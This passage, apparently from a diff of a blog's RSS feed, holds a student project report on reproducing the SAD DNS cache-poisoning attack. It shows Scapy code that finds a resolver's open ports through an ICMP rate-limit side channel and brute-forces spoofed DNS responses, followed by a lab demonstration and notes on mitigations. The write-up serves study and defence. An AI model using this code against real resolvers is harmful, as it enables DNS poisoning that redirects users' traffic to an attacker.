+          #We need to wait a moment to make sure no ICMP message was sent back
+          time.sleep(.01)
+          if found_open_port:
+             old_range = current_range
+             current_range = int((current_range) / 2)
+             found_open_port = False
+          else:
+             if old_range==50 and current_range==50:
+                break
+             current_start += current_range
+             current_range = old_range - current_range
+             old_range = current_range
+             current_range = int(current_range/2)
+          #We sleep to prevent burst rate-limit from tipping    
+          time.sleep(.05)
+       open_ports.append(current_start)
+       time.sleep(1)
+   t.stop()
+   return open_ports
+
+#Finally, we iterate through the open ports we found and iterate through QID
+query = Ether()/IP(src=attacker_ip,dst=target_resolver_ip)/UDP(sport=50000,dport=53)/DNS(id=50000, qd=DNSQR(qname="fill."+target_domain+"."), rd=1)
+response = Ether()/IP(src=target_auth_ip,dst=target_resolver_ip)/UDP(sport=53,dport=50000)/DNS(id=50000, qd=DNSQR(qname="fill."+target_domain+"."), aa=1, qr=1, an=DNSRR(rrname=target_domain+".",  ttl=36000, rdata=attacker_ip))
+
+dns_response_frame = bytearray(raw(response))
+
+query_header = make_header(query)
+response_header = make_header(response)
+s = conf.L2socket()
+while True:
+    d_str = get_random_string(4)+"."+target_domain+".";
+    query[DNS].qd = DNSQR(qname=d_str)
+
+    #The commented code is for debug mode, where we have the target resolver
+    #directly dig an authoritative nameserver to simulate the action of 
+    #recursion on behalf of the attacker.
+    #d_str = target_domain+"."
+    #s.send(query)
+    ports = find_ports()
+    for i in ports:
+       for qid in range(RESERVED_PORTS,MAX_PORT_NUM):
+          patch(dns_response_frame, response_header, i, qid, d_str)
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">The first segment of the code is dedicated to using a side-channel attack via ICMP error messages to determine what ports are open on the target resolver. Since the per-IP ICMP error message rate-limits are pretty stringent (1 message per second), I specifically use the global rate-limit as a side-channel to infer which swaths of ports contain an open port. The next section of the code then uses binary search to determine exactly which ports are open. The last section of the code more or less operates like Kaminsky&#8217;s attack.</p>
+
+
+
+<p class="wp-block-paragraph">One problem I had writing this implementation was getting Scapy to asynchronously sniff for ICMP error messages and perform the necessary action when a message is received. In fact, there is a bug in the code where the sniffer fails to execute when an error message is received during the binary search. In terms of performance, I struggled to get the attack to execute on an actual DNS request. This is because for BIND, DNS retries are spread out by a maximum of two seconds, and I couldn&#8217;t figure out how to increase this interval even via exponential backoff. This poses a problem because each transmission is sent using a different source port, meaning that source port identification <em>and</em> query ID determination needs to happen in under two seconds. The biggest bottleneck in the code speed as of now is the source port determination speed, as the global ICMP error message rate-limit caps the search speed at 1000 ports a second. Moreover, the binary search is slowed down somewhat by the per-IP rate-limit. Finally, if packet loss occurs at all, it leads to huge performance issues, as these missing packets are misinterpreted as indicating possible open ports on the resolver.</p>
+
+
+
+<p class="wp-block-paragraph">Given these complications, for demonstration purposes I turned off the authoritative nameserver&#8217;s BIND instance, sent a dig command for site.dummy.com from the resolver to the auth nameserver with a ridiculously long timeout, and ran the script on the attacker to determine the source port and query ID of the resolver&#8217;s request. This allowed me to spoof the response even with source-port randomization enabled on the resolver. While this scenario is indeed quite synthetic, it isn&#8217;t outlandish, as the dig request simulates a recursive query initiated by the attacker in the presence of an authoritative nameserver under load. Basically, you&#8217;d get the same situation as the attacker if you sent the query yourself to the resolver and DOSed the authoritative nameserver. Alternatively, if the target caching server were a forwarder, the attacker could send a request for an A record for a domain which they controlled&#8211;this would allow the attacker to extend the attack window. Furthermore, since bailiwick checking isn&#8217;t typically done on forwarding servers, the attacker could use this hung connection to spoof any kind of request that they want (note that in this case, the attacker would be impersonating the upstream resolver). Anyways, my results using this synthetic approach are captured by the following screencap:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="640" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32-1024x640.png" alt="" class="wp-image-29" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32-1024x640.png 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32-300x188.png 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32-768x480.png 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32-1536x960.png 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32-1568x980.png 1568w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-00-07-32.png 1920w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>SAD DNS Exploit: The top pane is the attacker, the bottom left is the client receiving spoofed dig response</figcaption></figure></div>
+
+
+
+<p class="wp-block-paragraph">The numbers in the top pane are debug prints corresponding to the binary search for the appropriate source port that dig is using on the client. The bottom right pane corresponds to the auth server, which is running a dummy UDP netcat server on port 53 to prevent dig from retransmitting requests (although running the nc server proved to be unnecessary, since with a sufficiently large timeout dig does not retransmit). As you can see, the side-channel successfully determines the source port and uses that as a prerequisite for a brute-force attack on the DNS QID&#8217;s.</p>
+
+
+
+<h2 class="wp-block-heading">Conclusion and Next Steps</h2>
+
+
+
+<p class="wp-block-paragraph">Beyond the rudiments of network programming, one thing I&#8217;ve learned doing this project is how much of a patch job DNS is. Every time there&#8217;s a major exploit, the solutions feel like band-aids over gaping wounds. Take the Kaminsky bug. One would imagine that this kind of exploit would galvanize adoption of cryptographically secure defenses like DNSSEC or DoT; instead, the preferred course of action was to hastily increase entropy by a mere 16 bits. Sure, DNS has strict latency requirements, which means that these security measures often come at the cost of performance; but even so, there are projects like <a href="https://dnscurve.org/">DNSCurve</a> which seek to be both reliable and performant. Hopefully, people will start taking exploits like these seriously and learn to adopt a proactive, rather than reactive, stance regarding DNS attack mitigations.</p>
+
+
+
+<p class="wp-block-paragraph">In terms of future work, one interesting avenue would be to implement a series of mitigation strategies to the SADDNS attack, starting with the obvious (rate-limit randomization/reduction, DNSSEC, ICMP filtering, DNS cookies) and moving on to the more exotic (using machine learning to adaptively detect whether a source port enumeration attempt is occurring). More importantly, though, I&#8217;d like to start by porting my code to C. In terms of efficiency/reliability/flexibility, I&#8217;ve become a bit frustrated with Scapy. While it is certainly a good library for its use case (network diagnostics and filtering), I think I&#8217;ve been stretching it to the limit somewhat. </p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://blog.nkontur.com/index.php/2021/01/04/sad-dns-cse-433-final-project-report/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
